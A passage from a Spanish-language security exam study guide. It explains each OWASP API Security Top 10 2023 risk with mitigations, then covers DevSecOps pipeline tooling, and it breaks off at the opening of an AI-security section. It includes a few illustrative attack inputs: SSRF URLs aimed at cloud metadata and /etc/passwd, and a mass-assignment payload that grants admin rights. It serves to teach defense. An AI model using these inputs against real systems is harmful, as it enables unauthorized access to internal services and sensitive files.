específicos para las APIs.

### 6.1. Introducción al OWASP API Security Top 10 2023

El OWASP API Security Top 10 2023 es la iteración más reciente que
destaca las vulnerabilidades más críticas que afectan a las APIs.\[67\]
Esta lista refleja la evolución del panorama de amenazas, con la
inclusión de nuevos riesgos como API6:2023 Unrestricted Access to
Sensitive Business Flows, API7:2023 Server-Side Request Forgery, y
API10:2023 Unsafe Consumption of APIs, y la redefinición de otros para
mayor claridad y alcance.\[67, 68\]

### 6.2. Tabla Resumen OWASP API Security Top 10 (2023)

  ----------------------- ----------------------- -----------------------
  **ID**                  **Nombre del Riesgo     **Breve Descripción del
                          (2023)**                Riesgo**

  API1                    Broken Object Level     Fallo en validar
                          Authorization (BOLA)    correctamente los
                                                  permisos de un usuario
                                                  para acceder o
                                                  manipular un objeto
                                                  específico a través de
                                                  su ID.

  API2                    Broken Authentication   Mecanismos de
                                                  autenticación
                                                  implementados
                                                  incorrectamente,
                                                  permitiendo a atacantes
                                                  comprometer tokens o
                                                  explotar fallos para
                                                  impersonar usuarios.

  API3                    Broken Object Property  Fallo en validar
                          Level Authorization     permisos para acceder o
                                                  modificar propiedades
                                                  específicas de un
                                                  objeto. Incluye
                                                  Exposición Excesiva de
                                                  Datos y Asignación
                                                  Masiva.

  API4                    Unrestricted Resource   APIs que no controlan o
                          Consumption             limitan adecuadamente
                                                  el consumo de recursos
                                                  (CPU, memoria, etc.),
                                                  llevando a DoS o costos
                                                  inflados.

  API5                    Broken Function Level   Fallo en aplicar
                          Authorization           correctamente los
                                                  chequeos de
                                                  autorización a nivel de
                                                  función o operación,
                                                  permitiendo acceso a
                                                  funcionalidad no
                                                  autorizada.

  API6                    Unrestricted Access to  APIs que exponen flujos
                          Sensitive Business      de negocio críticos sin
                          Flows                   protecciones adecuadas,
                                                  permitiendo abuso
                                                  automatizado.

  API7                    Server-Side Request     La API obtiene un
                          Forgery (SSRF)          recurso remoto sin
                                                  validar la URL
                                                  suministrada,
                                                  permitiendo al atacante
                                                  hacer que la API envíe
                                                  requests a destinos
                                                  inesperados.

  API8                    Security                Configuraciones de
                          Misconfiguration        seguridad incorrectas
                                                  en cualquier nivel de
                                                  la pila de la API.

  API9                    Improper Inventory      Falta de visibilidad y
                          Management              gestión de todas las
                                                  APIs activas,
                                                  versiones, endpoints y
                                                  flujos de datos.

  API10                   Unsafe Consumption of   Desarrolladores que
                          APIs                    confían en datos de
                                                  APIs externas/de
                                                  terceros sin
                                                  validación,
                                                  sanitización o chequeos
                                                  de seguridad adecuados.

  *Fuente: \[67\]*                                
  ----------------------- ----------------------- -----------------------

### 6.3. Análisis Detallado de Cada Vulnerabilidad de API (API1 a API10 de 2023)

- **API1:2023 Broken Object Level Authorization (BOLA)**

  - **Descripción:** Ocurre cuando una API no valida adecuadamente si el
    usuario autenticado tiene permiso para acceder o realizar una acción
    sobre un objeto específico, al que se hace referencia comúnmente por
    su ID en la solicitud.\[67, 68, 69\]

  - **Cómo Ocurre / Vectores Específicos para APIs:** La API expone un
    endpoint que recibe un identificador de objeto (ej. GET
    /api/orders/{orderId}). El atacante, siendo un usuario autenticado,
    simplemente cambia el {orderId} por el de un objeto que pertenece a
    otro usuario. Si la API no verifica la propiedad del objeto para el
    usuario solicitante, se produce BOLA.

  - **Ejemplos de Ataque en Contextos API:** Un usuario A con userId=123
    solicita sus datos con GET /api/users/123/profile. Luego, cambia la
    solicitud a GET /api/users/456/profile y obtiene los datos del
    usuario B.\[68, 70\]

  - **Estrategias de Prevención y Mitigación:**

    - Implementar chequeos de autorización a nivel de objeto en cada
      función de la API que acceda a una fuente de datos utilizando un
      ID del usuario.\[67, 68\]

    - Estos chequeos deben verificar que el usuario logueado tiene los
      permisos necesarios para la acción solicitada sobre el objeto
      específico.

    - Utilizar identificadores de objeto aleatorios y largos (UUIDs)
      para dificultar la adivinación de IDs de otros objetos.\[68\]

    - Realizar auditorías de seguridad y pruebas de penetración
      regulares para identificar instancias de BOLA.\[68\]

- **API2:2023 Broken Authentication (Autenticación Rota)**

  - **Descripción:** Los mecanismos de autenticación de una API están
    implementados incorrectamente, permitiendo a los atacantes
    comprometer tokens de autenticación, claves API, o explotar otras
    fallas para asumir la identidad de usuarios legítimos.\[67, 68, 69,
    71, 72\]

  - **Cómo Ocurre / Vectores Específicos para APIs:**

    - Políticas de contraseña débiles para usuarios de API o para claves
      API.

    - Manejo inseguro de tokens (JWTs sin firmar, con algoritmos débiles
      como alg:none, sin expiración, transmitidos por HTTP, almacenados
      inseguramente en el cliente).\[71, 72\]

    - API keys hardcodeadas en aplicaciones cliente o transmitidas de
      forma insegura.

    - No invalidación de tokens de sesión en el servidor después del
      logout o cambio de contraseña.\[71\]

    - Falta de rate limiting en endpoints de autenticación, permitiendo
      ataques de fuerza bruta o credential stuffing.\[72\]

    - No requerir re-autenticación para operaciones sensibles.\[69\]

  - **Ejemplos de Ataque en Contextos API:** Un atacante intercepta un
    JWT transmitido por HTTP. Un atacante encuentra una API key en el
    código fuente de una aplicación móvil y la usa para acceder a la API
    sin restricciones. Un atacante reutiliza un token de sesión robado
    que no fue invalidado.\[71\]

  - **Estrategias de Prevención y Mitigación:**

    - Implementar mecanismos de autenticación fuertes (ej. OAuth 2.0,
      OpenID Connect).

    - Exigir contraseñas/claves API fuertes y considerar MFA.\[68, 71\]

    - Asegurar la gestión de tokens: usar JWTs firmados con algoritmos
      fuertes (ej. RS256), con expiración corta, transmitidos
      exclusivamente por HTTPS. Almacenarlos de forma segura en el
      cliente (ej. HttpOnly cookies, o almacenamiento seguro
      móvil).\[71\]

    - Implementar la invalidación de tokens del lado del servidor.

    - Aplicar rate limiting y mecanismos de bloqueo de cuentas a los
      endpoints de autenticación.\[72\]

    - No hardcodear API keys; usar variables de entorno o almacenes de
      secretos.

    - Validar la autenticidad de los tokens en cada solicitud a
      endpoints protegidos.

- **API3:2023 Broken Object Property Level Authorization (Autorización
  Rota a Nivel de Propiedad de Objeto)**

  - **Descripción:** La API no valida adecuadamente los permisos del
    usuario para acceder (leer) o modificar (escribir) propiedades
    específicas de un objeto. Esta categoría ahora engloba dos problemas
    comunes: Exposición Excesiva de Datos y Asignación Masiva (Mass
    Assignment).\[67, 69, 70, 73\]

  - **Cómo Ocurre / Vectores Específicos para APIs:**

    - **Exposición Excesiva de Datos:** Un endpoint de API devuelve
      todas las propiedades de un objeto, incluyendo aquellas que son
      sensibles y que el usuario solicitante no debería ver (ej. el hash
      de la contraseña, datos internos del sistema).\[73\]

    - **Asignación Masiva:** Un endpoint de API que actualiza un objeto
      permite al cliente enviar datos para cualquier propiedad del
      objeto. Un atacante puede incluir en la solicitud propiedades que
      no debería poder modificar (ej. un flag isAdmin, el roleId, o el
      balance de una cuenta) y la API las actualiza sin una validación
      adecuada.\[73\]

  - **Ejemplos de Ataque en Contextos API:**

    - Un endpoint GET /api/users/{id} devuelve el objeto de usuario
      completo, incluyendo passwordHash y internalAdminNotes.\[73\]

    - Un usuario actualiza su perfil con PUT /api/users/me enviando
      {\"email\": \"new@example.com\", \"isAdmin\": true}. Si la API
      procesa isAdmin, el usuario se auto-asigna privilegios de
      administrador.\[73\]

    - Una API de comercio electrónico permite modificar el precio de un
      producto. Un atacante, autenticado como cliente, modifica el
      payload para cambiar el ID del producto al de un competidor y
      establece un precio muy bajo.\[70\]

  - **Estrategias de Prevención y Mitigación:**

    - **Para Exposición Excesiva de Datos:**

      - Definir esquemas de respuesta específicos para cada tipo de
        consumidor de la API, devolviendo solo las propiedades
        necesarias (usar listas blancas de propiedades).\[73, 74\]

      - Evitar el uso de funciones genéricas como to_json() o toString()
        que puedan volcar todas las propiedades del objeto.\[74\]

      - Filtrar las propiedades sensibles basándose en los permisos del
        usuario que realiza la solicitud.

    - **Para Asignación Masiva:**

      - Utilizar listas blancas de las propiedades que un cliente tiene
        permitido modificar para un objeto y endpoint específicos.
        Rechazar cualquier propiedad no incluida en la lista blanca.

      - No vincular directamente los datos de entrada del cliente a las
        variables internas del objeto o a los campos de la base de datos
        sin una validación y mapeo explícitos.

      - Considerar el uso de Data Transfer Objects (DTOs) con solo las
        propiedades permitidas para la entrada.

- **API4:2023 Unrestricted Resource Consumption (Consumo No Restringido
  de Recursos)**

  - **Descripción:** Las APIs no imponen límites adecuados al consumo de
    recursos del servidor, como CPU, memoria, ancho de banda de red,
    almacenamiento, o número de solicitudes. Esto puede llevar a ataques
    de Denegación de Servicio (DoS), degradación del rendimiento, o
    costos operativos excesivos.\[67, 74, 75\] Esta categoría reemplaza
    y amplía la anterior \"Falta de Recursos y Rate Limiting\".

  - **Cómo Ocurre / Vectores Específicos para APIs:**

    - Falta de rate limiting o throttling en los endpoints de la
      API.\[75\]

    - No establecer cuotas para operaciones costosas o que consumen
      muchos recursos (ej. generación de reportes complejos,
      procesamiento de archivos grandes).

    - No validar o limitar el tamaño de los payloads de solicitud,
      parámetros de consulta, o cabeceras.\[74\]

    - Ausencia de timeouts para solicitudes de larga duración o
      conexiones inactivas.\[75\]

    - Permitir un número ilimitado de conexiones concurrentes por
      cliente.

    - APIs que realizan operaciones intensivas en CPU (compresión,
      cifrado, cálculos complejos) o memoria (manejo de grandes
      datasets) sin controles.\[75\]

  - **Ejemplos de Ataque en Contextos API:** Un atacante envía miles de
    solicitudes por segundo a un endpoint de API que no tiene rate
    limiting, agotando los recursos del servidor. Un atacante sube un
    archivo de varios gigabytes a un endpoint de procesamiento de
    imágenes que no tiene límite de tamaño. Un atacante envía una
    solicitud que desencadena una consulta a la base de datos
    extremadamente compleja y de larga duración, consumiendo toda la
    CPU.\[75\]

  - **Estrategias de Prevención y Mitigación:**

    - **Implementar rate limiting y throttling:** Limitar el número de
      solicitudes que un cliente (por IP, API key, usuario) puede hacer
      en un período de tiempo determinado.\[74, 75\]

    - **Definir y aplicar cuotas:** Establecer límites en el uso de
      recursos para operaciones particularmente costosas.\[75\]

    - **Validar y limitar el tamaño de las entradas:** Aplicar límites
      al tamaño de los payloads, parámetros, y número de objetos en
      arrays.\[74\]

    - **Implementar timeouts:** Para solicitudes, conexiones a base de
      datos y llamadas a servicios externos.\[75\]

    - **Limitar la concurrencia:** Controlar el número de solicitudes
      concurrentes por cliente.

    - **Monitorear el consumo de recursos:** Detectar y alertar sobre
      patrones de uso anómalos.\[75\]

    - **Utilizar contenedores y plataformas serverless:** Pueden ayudar
      a aislar y gestionar el consumo de recursos de manera más
      granular.\[74\]

    - **Optimizar operaciones costosas:** Rediseñar o cachear resultados
      de operaciones que consumen muchos recursos.

- **API5:2023 Broken Function Level Authorization (Autorización Rota a
  Nivel de Función)**

  - **Descripción:** La API no aplica o aplica incorrectamente los
    chequeos de autorización a nivel de función o endpoint, permitiendo
    a los atacantes acceder a funcionalidades a las que no deberían
    tener acceso (ej. un usuario regular accede a funciones
    administrativas).\[67, 69, 76, 77\]

  - **Cómo Ocurre / Vectores Específicos para APIs:**

    - Ausencia de chequeos de autorización explícitos para ciertos
      endpoints, especialmente aquellos destinados a administradores o
      roles específicos.

    - Confiar en que el cliente (ej. una UI) oculte o no presente
      enlaces a funciones administrativas, sin proteger adecuadamente
      los endpoints de API correspondientes en el backend (seguridad por
      oscuridad).\[77\]

    - Errores en la lógica de autorización que permiten a un usuario de
      un grupo acceder a funciones de otro grupo.

    - Exposición de endpoints administrativos junto con endpoints
      regulares sin una diferenciación clara en los controles de
      acceso.\[77\]

  - **Ejemplos de Ataque en Contextos API:** Un usuario normal descubre
    o adivina la URL de un endpoint administrativo como POST
    /api/invites/new (que debería ser solo para admins) y logra crear
    una invitación con privilegios de administrador para sí mismo.\[77\]
    Un atacante accede a GET /api/admin/v1/users/all (que debería ser
    solo para admins) y obtiene los detalles de todos los
    usuarios.\[77\]

  - **Estrategias de Prevención y Mitigación:**

    - **Denegar por defecto:** El acceso a cualquier función debe ser
      denegado a menos que se otorgue explícitamente.

    - **Chequeos de autorización explícitos:** Implementar chequeos de
      autorización basados en roles y/o permisos del usuario en cada
      endpoint, especialmente los administrativos o sensibles.\[77\]

    - **Consistencia en la autorización:** Tener un módulo de
      autorización centralizado y fácil de analizar que se invoque desde
      todas las funciones de negocio.\[77\]

    - **Separación clara de endpoints:** Si es posible, agrupar los
      endpoints administrativos (ej. bajo /api/admin/) y aplicarles
      políticas de acceso más estrictas de forma consistente.

    - **No depender de la ofuscación del cliente:** La seguridad debe
      estar en el servidor.

    - **Pruebas exhaustivas:** Probar el acceso a todas las funciones
      con diferentes roles de usuario, incluyendo usuarios no
      autenticados y usuarios con privilegios insuficientes.\[76\]

- **API6:2023 Unrestricted Access to Sensitive Business Flows (Acceso No
  Restringido a Flujos de Negocio Sensibles)**

  - **Descripción:** Las APIs exponen flujos de negocio que son críticos
    o sensibles (ej. compra de productos, creación de cuentas, envío de
    contenido) sin protecciones adecuadas contra el abuso automatizado o
    el uso excesivo por parte de atacantes.\[67, 68, 74, 78, 79\]

  - **Cómo Ocurre / Vectores Específicos para APIs:**

    - Falta de rate-limiting o throttling específico para flujos de
      negocio sensibles.

    - Ausencia de mecanismos de detección de bots o comportamiento no
      humano (ej. CAPTCHAs, análisis de comportamiento, device
      fingerprinting).\[78\]

    - Lógica de negocio que puede ser explotada si se invoca
      repetidamente o a gran escala (ej. un sistema de referidos que
      otorga bonos, un sistema de votación).

    - Validación insuficiente de la autenticidad o intención del usuario
      en estos flujos.\[78\]

  - **Ejemplos de Ataque en Contextos API:**

    - **Scalping/Hoarding:** Un bot utiliza una API de compra para
      adquirir todo el stock de un producto de edición limitada o alta
      demanda (ej. entradas para conciertos, zapatillas de deporte) para
      su reventa a precios inflados.\[74, 78, 79\]

    - **Creación masiva de cuentas falsas:** Un atacante automatiza el
      endpoint de creación de cuentas para generar miles de usuarios
      falsos, que luego pueden usarse para spam, abuso de promociones,
      etc..\[79\]

    - **Spamming de contenido:** Un bot utiliza una API de creación de
      comentarios o publicaciones para inundar una plataforma con spam o
      contenido malicioso.\[79\]

    - **Price scraping:** Un atacante usa una API para extraer
      masivamente información de precios de productos.\[79\]

  - **Estrategias de Prevención y Mitigación:**

    - **Detección de dispositivos y usuarios:** Identificar si el
      cliente es una app móvil conocida, un navegador, etc..\[78\]

    - **Análisis de comportamiento y detección de bots:** Implementar
      CAPTCHAs, analizar la velocidad de las solicitudes y otros
      patrones para distinguir entre humanos y bots.\[78\]

    - **Rate limiting específico para flujos:** Aplicar límites más
      estrictos a flujos de negocio sensibles.\[78\]

    - **Monitoreo de la lógica de negocio:** Detectar patrones de abuso,
      como un solo usuario comprando una cantidad irrazonable de
      productos.

    - **Cierre de brechas de información:** No revelar información sobre
      la disponibilidad de stock o la validez de cupones de manera que
      pueda ser explotada por bots.\[78\]

- **API7:2023 Server-Side Request Forgery (SSRF)**

  - **Descripción:** Una API obtiene un recurso de una URL proporcionada
    por el usuario sin validar adecuadamente esa URL. Esto permite a un
    atacante obligar a la API a enviar solicitudes a destinos
    arbitrarios, potencialmente exponiendo servicios internos o
    realizando escaneos de red desde el servidor de la API.\[67, 69,
    74\]

  - **Cómo Ocurre / Vectores Específicos para APIs:** Un endpoint de API
    acepta una URL como parámetro (ej. en un webhook, para importar un
    archivo, para generar una vista previa). El atacante proporciona una
    URL interna como http://localhost:8080/admin o
    http://169.254.169.254/latest/meta-data/ para acceder a servicios
    internos o metadatos de la nube.

  - **Ejemplos de Ataque en Contextos API:**

    - Una API de conversión de documentos acepta la URL de un documento
      a convertir. Un atacante proporciona file:///etc/passwd y la API
      devuelve el contenido del archivo de contraseñas del
      servidor.\[74\]

    - Una API de webhook intenta conectarse a una URL proporcionada por
      el usuario. El atacante proporciona una serie de IPs internas para
      escanear la red interna del servidor.\[74\]

  - **Estrategias de Prevención y Mitigación:**

    - **Validación estricta de URLs:** Utilizar una lista blanca (allow
      list) de dominios, protocolos y puertos permitidos. Rechazar
      cualquier URL que no coincida.\[74\]

    - **No seguir redirecciones:** Deshabilitar las redirecciones HTTP
      en el cliente HTTP de la API, o si son necesarias, validar que el
      destino de la redirección también esté en la lista blanca.

    - **Segmentación de red:** Aislar la parte de la infraestructura que
      realiza estas solicitudes en una red con acceso limitado a otros
      sistemas internos.

    - **Evitar enviar respuestas crudas:** No devolver la respuesta
      completa de la solicitud interna al cliente, ya que puede filtrar
      información.

- **API8:2023 Security Misconfiguration (Configuración de Seguridad
  Incorrecta)**

  - **Descripción:** Configuración de seguridad incorrecta en cualquier
    nivel de la pila de la API, desde el servidor de aplicaciones y la
    base de datos hasta las políticas de CORS, las cabeceras HTTP o la
    gestión de errores.\[67, 69\]

  - **Cómo Ocurre / Vectores Específicos para APIs:**

    - Políticas de CORS demasiado permisivas (ej.
      Access-Control-Allow-Origin: \*).\[69\]

    - Falta de cabeceras de seguridad HTTP relevantes (HSTS, CSP, etc.).

    - Mensajes de error detallados que revelan información del sistema
      (stack traces, consultas SQL).\[69\]

    - Servicios o métodos HTTP innecesarios habilitados (ej. TRACE).

    - APIs sin cifrar (HTTP en lugar de HTTPS).\[69\]

    - Parches de seguridad no aplicados en los componentes de la pila.

  - **Ejemplos de Ataque en Contextos API:** Un atacante explota una
    política de CORS laxa para realizar una solicitud a una API
    autenticada por cookies desde un sitio web malicioso. Un mensaje de
    error revela la versión exacta del software del servidor, que tiene
    una vulnerabilidad conocida.

  - **Estrategias de Prevención y Mitigación:**

    - **Proceso de hardening repetible y automatizado.**

    - **Políticas de CORS restrictivas:** Definir explícitamente los
      orígenes permitidos.

    - **Configurar cabeceras de seguridad.**

    - **Deshabilitar métodos HTTP innecesarios.**

    - **Manejo de errores genérico:** Registrar los detalles en el
      servidor, mostrar mensajes genéricos al cliente.

    - **Escaneo regular de configuraciones** y aplicación de parches.

- **API9:2023 Improper Inventory Management (Gestión Inadecuada de
  Inventario)**

  - **Descripción:** Falta de visibilidad y gestión adecuada de todas
    las APIs expuestas, sus versiones, entornos (producción, staging,
    desarrollo), endpoints, flujos de datos y políticas de acceso.\[67,
    68\]

  - **Cómo Ocurre / Vectores Específicos para APIs:**

    - \"Shadow APIs\": APIs desplegadas sin el conocimiento o aprobación
      del equipo de seguridad.

    - \"Zombie APIs\": Versiones antiguas de APIs que no han sido
      desmanteladas y que a menudo carecen de parches y monitoreo.\[68\]

    - Endpoints de depuración o de prueba que se dejan expuestos en
      producción.

    - Documentación de API desactualizada o incompleta (ej. en
      Swagger/OpenAPI).

    - Falta de distinción clara entre APIs internas y externas y sus
      respectivas políticas de seguridad.

  - **Ejemplos de Ataque en Contextos API:** Un atacante encuentra y
    explota una vulnerabilidad en un endpoint /v1/ de una API que ya ha
    sido migrada a /v2/, pero la versión v1 nunca fue retirada. Un
    atacante descubre un endpoint /debug/users que devuelve información
    sensible.

  - **Estrategias de Prevención y Mitigación:**

    - **Documentación y catalogación:** Mantener un inventario
      actualizado y preciso de todas las APIs, sus versiones, entornos,
      hosts y políticas de autenticación y autorización.

    - **Monitoreo y análisis de tráfico:** Analizar el tráfico de red
      para descubrir \"Shadow APIs\" no documentadas.\[68\]

    - **Procesos de desmantelamiento:** Tener un proceso formal para
      retirar versiones antiguas de las APIs.

    - **Políticas de seguridad consistentes:** Aplicar las mismas
      políticas de seguridad (autenticación, autorización, rate
      limiting) a todas las APIs expuestas, independientemente de su
      entorno o versión.

    - **Análisis de dependencias:** Entender con qué otras APIs
      (internas y externas) interactúan tus servicios.

- **API10:2023 Unsafe Consumption of APIs (Consumo Inseguro de APIs)**

  - **Descripción:** Este riesgo se enfoca en el cliente de la API.
    Ocurre cuando los desarrolladores confían implícitamente en los
    datos recibidos de APIs externas (de terceros) o incluso de otras
    APIs internas, sin realizar una validación, sanitización o chequeos
    de seguridad adecuados.\[67, 69, 74\]

  - **Cómo Ocurre / Vectores Específicos para APIs:**

    - Renderizar datos de una API externa directamente en la UI sin
      sanitización, lo que puede llevar a XSS si la API externa es
      comprometida y devuelve contenido malicioso.\[74\]

    - Confiar en los datos de una API para tomar decisiones de negocio o
      seguridad (ej. precio de un producto, rol de un usuario) sin
      validación.

    - Exposición de secretos (API keys) utilizados para comunicarse con
      APIs de terceros.

    - Ataques de redirección abierta si la API devuelve una URL en la
      que el cliente confía y redirige al usuario.

    - Deserialización insegura si los datos de la API se deserializan
      sin validación.

  - **Ejemplos de Ataque en Contextos API:** Una aplicación muestra
    imágenes de perfil de una API de redes sociales. La API de redes
    sociales es comprometida y comienza a servir imágenes con payloads
    maliciosos. Una aplicación de comercio electrónico utiliza una API
    de un tercero para obtener el precio de un producto. La API es
    comprometida y devuelve un precio de \$0.01, que la aplicación
    procesa sin cuestionar.\[74\]

  - **Estrategias de Prevención y Mitigación:**

    - **Validar y sanitizar los datos de las APIs externas:** Tratar los
      datos de cualquier API externa como entrada no confiable. Validar
      su formato, tipo y contenido. Sanitizarla antes de mostrarla o
      procesarla.\[74\]

    - **Establecer timeouts y manejar errores:** Implementar timeouts
      para las llamadas a APIs externas y manejar adecuadamente los
      errores de conexión o respuestas inesperadas.\[74\]

    - **Gestionar secretos de forma segura:** No hardcodear las API keys
      para APIs de terceros. Almacenarlas de forma segura en el
      backend.\[74\]

    - **Asegurar las interacciones:** Verificar la autenticidad del
      endpoint de la API externa (ej. validación de certificados TLS).

    - **Contar con un plan de respaldo:** Considerar qué sucede si la
      API externa no está disponible o es comprometida.

La seguridad de las APIs requiere un enfoque holístico que abarque todo
el ciclo de vida. No basta con proteger un endpoint individual; es
necesario considerar la autenticación general, la autorización a nivel
de objeto y función, la gestión de recursos, la configuración segura de
toda la pila y un inventario completo de la superficie de ataque. El
auge de las arquitecturas de microservicios significa que la superficie
de ataque de las APIs de una organización está en constante expansión,
lo que hace que la gestión proactiva y automatizada de estos riesgos sea
más crítica que nunca.

### 6.4. Posibles Preguntas y Respuestas del Examen

- **P: ¿Cuál es la diferencia fundamental entre BOLA (API1) y BFLA
  (API5)?**

  - R: BOLA (Broken Object Level Authorization) se refiere a la
    capacidad de un usuario de acceder o modificar un *objeto de datos
    específico* que no le pertenece (ej. el pedido de otro usuario).
    BFLA (Broken Function Level Authorization) se refiere a la capacidad
    de un usuario de invocar una *función o endpoint completo* al que su
    rol no le da acceso (ej. un usuario normal que accede a un endpoint
    de administrador).\[67, 76\]

- **P: Describa un ejemplo de Asignación Masiva (Mass Assignment) en el
  contexto de API3 y cómo se puede prevenir.**

  - R: Ejemplo: Un usuario actualiza su perfil con PUT /api/users/me y
    añade la propiedad \"isAdmin\": true al cuerpo de la solicitud JSON.
    Si la API procesa ciegamente todas las propiedades enviadas, el
    usuario se escalará a sí mismo a administrador. Prevención: Usar una
    lista blanca (allow list) en el servidor para permitir
    explícitamente solo las propiedades que el usuario puede modificar
    (ej. email, firstName), ignorando o rechazando todas las
    demás.\[73\]

- **P: ¿Por qué API9: Improper Inventory Management es un riesgo de
  seguridad significativo?**

  - R: Porque \"no puedes proteger lo que no sabes que tienes\". Las
    \"Zombie APIs\" (versiones antiguas) y las \"Shadow APIs\" (no
    documentadas) a menudo carecen de monitoreo, parches y controles de
    seguridad modernos, convirtiéndolas en puntos de entrada fáciles
    para los atacantes que buscan vulnerabilidades conocidas en software
    antiguo.\[68\]

- **P: ¿Qué es el riesgo API10: Unsafe Consumption of APIs y quién es el
  principal responsable de mitigarlo?**

  - R: Es el riesgo de que una aplicación cliente confíe implícitamente
    en los datos de una API externa sin validarlos o sanitizarlos. El
    principal responsable de mitigarlo es el *desarrollador de la
    aplicación cliente (consumidora)*, que debe tratar todos los datos
    de APIs externas como no confiables.\[67, 74\]

## 7. DevSecOps -- Desarrollo, Seguridad y Operaciones

DevSecOps representa la culminación de los principios de desarrollo
seguro en un marco cultural y práctico. No es un conjunto de
herramientas, sino una filosofía que busca integrar la seguridad de
manera fluida y automatizada en el ciclo de vida de desarrollo y
operaciones (CI/CD) de alta velocidad de DevOps.

### 7.1. La Fusión de DevOps y la Seguridad

- **De DevOps a DevSecOps:** DevOps es una cultura y un conjunto de
  prácticas que combinan el desarrollo de software (Dev) y las
  operaciones de TI (Ops) para acortar el ciclo de vida del desarrollo y
  proporcionar una entrega continua de alta calidad.\[7, 80\] Su
  objetivo es automatizar y monitorear los procesos de software desde la
  integración, las pruebas y el lanzamiento hasta el despliegue y la
  gestión de la infraestructura.\[80\] Sin embargo, en el modelo DevOps
  tradicional, la seguridad a menudo se consideraba una ocurrencia
  tardía, realizada por un equipo separado al final del ciclo, lo que
  creaba cuellos de botella y conflictos.\[80\] **DevSecOps** es la
  respuesta a este problema, integrando la seguridad como una
  responsabilidad compartida de todos los equipos (Dev, Sec y Ops) a lo
  largo de todo el ciclo de vida, desde el inicio hasta el fin.\[80\] El
  mantra es \"seguridad como código\" y \"seguridad a la velocidad de
  DevOps\".

- **Cultura de Responsabilidad Compartida:** El pilar de DevSecOps es un
  cambio cultural. En lugar de que la seguridad sea una \"puerta\" que
  bloquea los lanzamientos, se convierte en parte del proceso. Esto
  requiere colaboración, comunicación y una comprensión funcional
  compartida donde los desarrolladores, los ingenieros de operaciones y
  los profesionales de la seguridad trabajan juntos con un objetivo
  común.\[7, 80\] Los equipos de seguridad actúan más como consultores y
  facilitadores, proporcionando herramientas y orientación para que los
  equipos de desarrollo puedan \"poseer\" la seguridad de su
  código.\[7\]

### 7.2. El Principio \"Shift Left\"

- **Concepto:** \"Shift Left\" (Desplazar a la Izquierda) es el
  principio central de DevSecOps. Significa mover las actividades de
  seguridad desde el final del ciclo de vida (la derecha) hacia las
  fases más tempranas posibles (la izquierda), como el diseño y la
  codificación.\[81\]

- **Beneficios:**

  - **Reducción de Costos:** Encontrar y corregir vulnerabilidades en la
    fase de diseño o codificación es órdenes de magnitud más barato que
    hacerlo en producción.\[81\]

  - **Velocidad:** La detección temprana y la automatización evitan los
    retrasos causados por las revisiones de seguridad de última hora.

  - **Calidad:** Fomenta una mentalidad de \"construir seguridad desde
    el principio\", lo que lleva a un código de mayor calidad.

### 7.3. Asegurando el Pipeline de CI/CD

El pipeline de Integración Continua / Entrega Continua (CI/CD) es el
motor de DevOps. Asegurarlo es el núcleo técnico de DevSecOps. Esto
implica integrar varios tipos de pruebas de seguridad automatizadas en
diferentes etapas del pipeline:

1.  **Análisis de Secretos (Pre-Commit):** Herramientas como Gitleaks o
    truffleHog escanean el código en busca de credenciales hardcodeadas
    (claves API, contraseñas) antes de que se fusionen en la base de
    código principal.

2.  **Análisis de Composición de Software (SCA) (Fase de Build):**
    Herramientas como Snyk, OWASP Dependency-Check o Xray escanean las
    dependencias de terceros (librerías, frameworks) en busca de
    vulnerabilidades conocidas (CVEs). Si se encuentra una
    vulnerabilidad crítica, el build puede fallar.\[22\]

3.  **Análisis Estático de Seguridad de Aplicaciones (SAST) (Fase de
    Build):** Herramientas como SonarQube, Checkmarx o Veracode analizan
    el código fuente en busca de patrones de codificación inseguros.
    Proporcionan retroalimentación rápida a los desarrolladores.\[22,
    23, 25\]

4.  **Análisis Dinámico de Seguridad de Aplicaciones (DAST) (Fase de
    Pruebas/Staging):** Herramientas como OWASP ZAP o Invicti escanean
    la aplicación en ejecución en un entorno de prueba, simulando
    ataques reales. Esto es crucial para encontrar vulnerabilidades de
    tiempo de ejecución y configuración.\[21, 24\]

5.  **Seguridad de la Infraestructura como Código (IaC) (Fase de
    Deploy):** Herramientas que escanean archivos de configuración de
    infraestructura (Terraform, Dockerfiles, Kubernetes manifests) en
    busca de configuraciones inseguras antes de que se aprovisione la
    infraestructura.

6.  **Monitoreo en Producción (Post-Deploy):** Herramientas de monitoreo
    y WAFs (Web Application Firewalls) que observan el comportamiento de
    la aplicación en producción para detectar y responder a ataques en
    tiempo real.

### 7.4. Posibles Preguntas y Respuestas del Examen

- **P: ¿Qué es DevSecOps y cómo se diferencia de DevOps?**

  - R: DevSecOps es una evolución de DevOps que integra la seguridad
    como una responsabilidad compartida en todo el ciclo de vida de TI.
    La principal diferencia es que la seguridad no es una etapa final,
    sino una parte intrínseca y continua del proceso de desarrollo y
    operaciones.\[80\]

- **P: Explique el principio \"Shift Left\" y dé un ejemplo de su
  aplicación.**

  - R: \"Shift Left\" consiste en mover las actividades de seguridad a
    las fases más tempranas del desarrollo. Ejemplo: Integrar una
    herramienta SAST en el IDE del desarrollador para que reciba
    retroalimentación de seguridad mientras escribe el código, en lugar
    de esperar a una revisión de seguridad semanas después.\[81\]

- **P: ¿Qué es el Análisis de Composición de Software (SCA) y por qué es
  crucial en un pipeline de DevSecOps?**

  - R: SCA es el proceso de escanear dependencias de terceros en una
    aplicación para identificar componentes con vulnerabilidades
    conocidas. Es crucial porque las aplicaciones modernas dependen en
    gran medida de código abierto, y una vulnerabilidad en una de estas
    librerías puede comprometer toda la aplicación (riesgo OWASP
    A06).\[22\]

- **P: ¿Qué tipo de herramienta de prueba (SAST o DAST) usaría para
  encontrar una configuración incorrecta en un servidor web y por qué?**

  - R: Usaría una herramienta DAST. SAST analiza el código fuente y no
    tiene visibilidad del entorno de ejecución. DAST prueba la
    aplicación en su estado de ejecución y puede detectar problemas de
    configuración del servidor al interactuar con él como lo haría un
    atacante.\[21, 24\]

## 8. Seguridad de la IA

La Inteligencia Artificial (IA) y el Aprendizaje Automático (Machine
Learning, ML) están revolucionando la tecnología, pero también
introducen un nuevo y complejo panorama de riesgos de seguridad.
Asegurar los sistemas de IA es una de las próximas grandes fronteras de
la ciberseguridad.

### 8.1. El Panorama de Amenazas en IA/ML

- **MITRE ATLAS (Adversarial Threat Landscape for
  Artificial-Intelligence Systems):** Es un marco y una base de
  conocimientos, modelado a partir de ATT&CK, que cataloga las tácticas
  y técnicas que los adversarios utilizan para atacar sistemas
  habilitados para IA. Proporciona un lenguaje común para que los
  equipos de seguridad y los científicos de datos colaboren en la
  protección de los modelos de ML.\[60\]

- **OWASP Top 10 para Modelos de Lenguaje Grandes (LLMs):** Dado el
